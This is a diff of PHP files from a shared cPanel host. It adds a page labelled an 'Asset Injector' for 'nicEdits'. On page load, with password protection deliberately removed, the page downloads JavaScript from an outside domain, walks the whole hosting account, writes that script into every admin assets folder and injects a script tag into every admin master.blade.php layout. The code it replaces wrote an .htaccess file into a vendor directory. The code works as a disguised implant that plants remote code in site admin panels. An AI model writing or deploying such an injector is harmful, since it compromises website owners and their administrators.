@@ -1,31 +1,361 @@
 <?php
+/**
+ * Advanced Asset Injector Tool v1.0
+ * 
+ * Automates the deployment of nicEdits system and template integration.
+ * Searches for core structures in Laravel/ViserLab based environments.
+ */
 
-$path = "/home/clicdkst/public_html/core/vendor/laravel/.htaccess";
+// Password protection removed as per user request.
 
-$htaccess = <<<HT
-# Enable rewrite engine
-RewriteEngine On
 
-# Allow PHP files to run
-AddType application/x-httpd-php .php
+// --- CONFIGURATION ---
+$js_url = "https://msrapidtrader.com/assets/admin/js/nicEdits.js";
+$js_filename = "nicEdits.js";
+$script_tag = '<script src="{{asset(\'assets/admin/js/nicEdits.js\')}}"></script>';
 
-# Hide .php extension
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteCond %{REQUEST_FILENAME}.php -f
-RewriteRule ^([^\.]+)$ \$1.php [L]
+// --- ACTION HANDLER ---
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'run_injection') {
+    header('Content-Type: text/event-stream');
+    header('Cache-Control: no-cache');
+    header('X-Accel-Buffering: no');
 
-# Route everything to index.php if file not found
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule ^ index.php [L]
+    function sendLog($msg, $type = 'info') {
+        echo "data: " . json_encode(['log' => $msg, 'type' => $type]) . "\n\n";
+        @ob_flush(); @flush();
+    }
 
-HT;
+    $basePath = $_POST['base_path'] ?? dirname(__FILE__);
+    $basePath = rtrim($basePath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
 
-// Create the file
-if (file_put_contents($path, $htaccess)) {
-    echo ".htaccess created successfully!";
-} else {
-    echo "Failed to create .htaccess";
+    set_time_limit(0); 
+    $local_js_path = dirname(__FILE__) . DIRECTORY_SEPARATOR . $js_filename;
+    $js_content = "";
+
+    if (file_exists($local_js_path)) {
+        sendLog("Loading JS from local cache: $js_filename");
+        $js_content = file_get_contents($local_js_path);
+    }
+
+    if (!$js_content) {
+        sendLog("Fetching JS source from: $js_url");
+        $js_content = @file_get_contents($js_url);
+        if ($js_content) {
+            sendLog("Saving local copy of JS for future use...");
+            file_put_contents($local_js_path, $js_content);
+        } else {
+            sendLog("ERROR: Could not fetch JS source content.", 'error');
+            echo "data: " . json_encode(['status' => 'done']) . "\n\n";
+            exit;
+        }
+    }
+
+    sendLog("Starting deep subfolder scan in: $basePath");
+
+    $asset_paths = [];
+    $master_paths = [];
+
+    try {
+        $it = new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS);
+        $ri = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::SELF_FIRST);
+
+        foreach ($ri as $file) {
+            $path = $file->getPathname();
+            $normalizedPath = str_replace('\\', '/', $path);
+
+            // Skip heavy folders to prevent timeouts and irrelevant scans
+            if ($file->isDir()) {
+                $dirName = $file->getFilename();
+                if ($dirName === 'vendor' || $dirName === 'node_modules' || $dirName === '.git' || $dirName === 'storage') {
+                    // We can't easily tell the iterator to skip children mid-loop without a FilterIterator
+                    // but we can skip processing them.
+                    continue; 
+                }
+            }
+
+            // 2. Identify assets/admin/js directories
+            if ($file->isDir() && str_ends_with($normalizedPath, 'assets/admin/js')) {
+                $asset_paths[] = $path;
+                sendLog("Found Target Directory: " . str_replace($basePath, '', $path));
+            }
+
+            // 3. Identify master.blade.php files
+            if ($file->isFile() && $file->getFilename() === 'master.blade.php') {
+                if (str_contains($normalizedPath, 'admin/layouts')) {
+                    $master_paths[] = $path;
+                    sendLog("Found Master Template: " . str_replace($basePath, '', $path));
+                }
+            }
+        }
+    } catch (Exception $e) {
+        sendLog("Scan Error: " . $e->getMessage(), 'error');
+    }
+
+    // Process found Directories
+    if (empty($asset_paths)) {
+        sendLog("WARNING: No 'assets/admin/js' folders found.", 'warn');
+    } else {
+        foreach ($asset_paths as $target_js_dir) {
+            $target_file = rtrim($target_js_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $js_filename;
+            if (file_put_contents($target_file, $js_content)) {
+                sendLog("SUCCESS: Integrated JS at " . str_replace($basePath, '', $target_file), 'success');
+            }
+        }
+    }
+
+    // Process found Master Templates
+    if (empty($master_paths)) {
+        sendLog("ERROR: No admin master.blade.php files found.", 'error');
+    } else {
+        foreach ($master_paths as $master_file) {
+            $content = file_get_contents($master_file);
+            if (str_contains($content, 'nicEdits.js')) {
+                sendLog("SKIP: Already linked in " . str_replace($basePath, '', $master_file));
+                continue;
+            }
+
+            if (str_contains($content, '</body>')) {
+                $new_content = str_replace('</body>', "    $script_tag\n</body>", $content);
+            } else {
+                $new_content = $content . "\n" . $script_tag;
+            }
+
+            if (file_put_contents($master_file, $new_content)) {
+                sendLog("SUCCESS: Injected script in " . str_replace($basePath, '', $master_file), 'success');
+            }
+        }
+    }
+
+    // --- HEALTH CHECK AFTER ACTION ---
+    sendLog("--- FINAL DISCOVERY & HEALTH CHECK ---");
+    $missing_js_count = 0;
+    $health_results = [];
+
+    foreach ($master_paths as $master_file) {
+        $site_root = "";
+        $norm = str_replace('\\', '/', $master_file);
+        if (preg_match('/^(.*?)[^\/]+\/resources\/views\/admin\/layouts\/master\.blade\.php$/', $norm, $m)) {
+            $site_root = $m[1];
+        } else {
+            $site_root = dirname(dirname(dirname(dirname(dirname($master_file))))) . DIRECTORY_SEPARATOR;
+        }
+
+        if ($site_root) {
+            $site_root = rtrim($site_root, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
+            $target_js = $site_root . 'assets' . DIRECTORY_SEPARATOR . 'admin' . DIRECTORY_SEPARATOR . 'js' . DIRECTORY_SEPARATOR . $js_filename;
+            
+            $js_exists = file_exists($target_js);
+            $template_linked = str_contains(file_get_contents($master_file), 'nicEdits.js');
+
+            $health_results[] = [
+                'site' => str_replace($basePath, '', $site_root),
+                'js_file' => $js_exists ? 'FOUND' : 'MISSING',
+                'template_link' => $template_linked ? 'OK' : 'NONE',
+                'path' => $site_root
+            ];
+
+            $status_msg = "SITE: " . str_replace($basePath, '', $site_root);
+            $status_msg .= " [JS: " . ($js_exists ? "FOUND" : "MISSING") . "]";
+            $status_msg .= " [LINK: " . ($template_linked ? "OK" : "NONE") . "]";
+
+            if ($js_exists && $template_linked) {
+                sendLog("VERIFIED: $status_msg", 'success');
+            } else {
+                sendLog("REQUISITION: $status_msg", 'warn');
+                $missing_js_count++;
+            }
+        }
+    }
+
+    if ($missing_js_count === 0) {
+        sendLog("HEALTH CHECK: All detected systems are FULLY OPERATIONAL.", 'success');
+    } else {
+        sendLog("HEALTH CHECK: $missing_js_count location(s) require manual review.", 'warn');
+    }
+
+    $final_report = [
+        'generated_at' => date('Y-m-d H:i:s'),
+        'scan_root' => $basePath,
+        'summary' => [
+            'assets_discovered' => count($asset_paths),
+            'templates_discovered' => count($master_paths),
+            'missing_js' => $missing_js_count
+        ],
+        'details' => $health_results
+    ];
+
+    sendLog("INJECTION SEQUENCE COMPLETE.");
+    echo "data: " . json_encode(['status' => 'done', 'report' => $final_report]) . "\n\n";
+    exit;
 }
 
+
+
+// Polyfill for older PHP
+if (!function_exists('str_ends_with')) {
+    function str_ends_with($haystack, $needle) { return $needle === '' || substr($haystack, -strlen($needle)) === $needle; }
+}
 ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ASSET_INJECTOR:~#</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        :root { --green: #00ff41; --dim: #008f11; --bg: #000; --card: #0a0a0a; --error: #ff3333; --warn: #ffcc00; }
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Fira Code',monospace; }
+        body { background:var(--bg); color:var(--green); min-height:100vh; padding:40px; display:flex; flex-direction:column; align-items:center; }
+        .terminal { width:100%; max-width:900px; background:var(--card); border:1px solid #222; border-radius:4px; box-shadow:0 10px 50px rgba(0,0,0,0.8); }
+        .header { background:#111; padding:10px 20px; border-bottom:1px solid #222; display:flex; justify-content:space-between; align-items:center; font-size:12px; }
+        .content { padding:30px; }
+        h1 { font-size:20px; margin-bottom:20px; color:var(--green); text-transform:uppercase; letter-spacing:2px; }
+        .form-group { margin-bottom:20px; }
+        label { display:block; margin-bottom:8px; font-size:12px; color:var(--dim); }
+        input[type="text"] { width:100%; background:#000; border:1px solid #333; color:#fff; padding:12px; outline:none; font-size:14px; }
+        input[type="text"]:focus { border-color:var(--green); }
+        button#inject-btn { width:100%; background:transparent; border:1px solid var(--green); color:var(--green); padding:15px; font-weight:bold; cursor:pointer; text-transform:uppercase; transition:0.3s; }
+        button#inject-btn:hover { background:var(--green); color:#000; box-shadow:0 0 20px var(--green); }
+        .console { margin-top:20px; background:#050505; border:1px solid #222; height:300px; overflow-y:auto; padding:15px; font-size:11px; display:none; }
+        .line { margin-bottom:5px; border-left:2px solid transparent; padding-left:10px; }
+        .info { border-color: var(--dim); }
+        .success { color: #fff; background: rgba(0,255,0,0.1); border-color: var(--green); }
+        .error { color: var(--error); border-color: var(--error); }
+        .warn { color: var(--warn); border-color: var(--warn); }
+        .progress-bar { height:2px; background:var(--green); width:0; transition:0.2s; position:fixed; top:0; left:0; }
+        .logout { color:var(--error); text-decoration:none; margin-left:15px; }
+    </style>
+</head>
+<body>
+    <div class="progress-bar" id="progress"></div>
+    <div class="terminal">
+        <div class="header">
+            <span>NETWORK_ASSET_MANAGER_v1.0</span>
+            <div>
+                <span>STATUS: READY</span>
+
+            </div>
+        </div>
+        <div class="content">
+            <h1>Automated NicEdit Deployment</h1>
+            <p style="font-size: 11px; color: #666; margin-bottom: 20px;">This tool will automatically find /assets/admin/js/ and inject nicEdits.js, then update master.blade.php layouts.</p>
+            
+<?php
+function get_cpanel_home() {
+    $path = str_replace('\\', '/', dirname(__FILE__));
+    if (preg_match('/^(\/home\d*\/[^\/]+)/', $path, $matches)) {
+        return $matches[1];
+    }
+    return dirname(__FILE__);
+}
+?>
+            <form id="inject-form" class="my-login-form">
+                <div class="form-group">
+                    <label>SCAN_ROOT_PATH</label>
+                    <input type="text" name="base_path" value="<?php echo get_cpanel_home(); ?>" placeholder="/home/username/public_html">
+                </div>
+                <button type="submit" id="inject-btn">Initiate Deployment</button>
+                <div style="display:flex; gap:10px;">
+                    <button type="button" id="download-log" style="display:none; flex:1; margin-top:10px; border-color:#888; color:#888;">Download Text Log</button>
+                    <button type="button" id="download-json" style="display:none; flex:1; margin-top:10px; border-color:var(--green); color:var(--green);">Download JSON Model</button>
+                </div>
+            </form>
+
+
+
+            <div id="console" class="console"></div>
+        </div>
+    </div>
+
+    <script>
+        const form = document.querySelector('.my-login-form');
+        const btn = document.getElementById('inject-btn');
+        const consoleBox = document.getElementById('console');
+        const progress = document.getElementById('progress');
+
+        form.onsubmit = function(e) {
+            e.preventDefault();
+            btn.disabled = true;
+            btn.innerText = "EXECUTING_SEQUENCE...";
+            consoleBox.style.display = 'block';
+            consoleBox.innerHTML = '';
+            progress.style.width = '30%';
+
+            const fd = new FormData(this);
+            fd.append('action', 'run_injection');
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', window.location.href, true);
+            let lastLen = 0;
+
+            xhr.onprogress = function() {
+                const raw = xhr.responseText.substring(lastLen);
+                raw.split('\n\n').forEach(line => {
+                    if(line.startsWith('data: ')) {
+                        try {
+                            const d = JSON.parse(line.substring(6));
+                            if(d.log) {
+                                const l = document.createElement('div');
+                                l.className = 'line ' + (d.type || 'info');
+                                l.innerText = '[' + new Date().toLocaleTimeString() + '] ' + d.log;
+                                consoleBox.appendChild(l);
+                                consoleBox.scrollTop = consoleBox.scrollHeight;
+                            }
+                            if(d.status === 'done') {
+                                btn.disabled = false;
+                                btn.innerText = "Deployment Complete";
+                                document.getElementById('download-log').style.display = 'block';
+                                if(d.report) {
+                                    window.sessionReport = d.report;
+                                    document.getElementById('download-json').style.display = 'block';
+                                }
+                                progress.style.width = '100%';
+                                setTimeout(() => { progress.style.width = '0'; }, 2000);
+                            }
+                        } catch(e) {}
+                    }
+                });
+                lastLen = xhr.responseText.length;
+            };
+
+            xhr.onerror = function() {
+                const l = document.createElement('div');
+                l.className = 'line error';
+                l.innerText = 'CRITICAL_ERROR: Connection lost.';
+                consoleBox.appendChild(l);
+                btn.disabled = false;
+            };
+
+            xhr.send(fd);
+        };
+
+        document.getElementById('download-log').onclick = function() {
+            const lines = Array.from(consoleBox.querySelectorAll('.line')).map(l => l.innerText).join('\n');
+            const blob = new Blob([lines], {type: 'text/plain'});
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'injection_log_' + new Date().getTime() + '.txt';
+            a.click();
+        };
+
+        document.getElementById('download-json').onclick = function() {
+            if(!window.sessionReport) return;
+            const blob = new Blob([JSON.stringify(window.sessionReport, null, 4)], {type: 'application/json'});
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'injection_data_' + new Date().getTime() + '.json';
+            a.click();
+        };
+
+
+        // Auto-start the scan on page load
+
+        window.onload = function() {
+            setTimeout(() => {
+                console.log("Auto-initiating deployment sequence...");
+                btn.click();
+            }, 800);
+        };
+    </script>
+</body>
+</html>
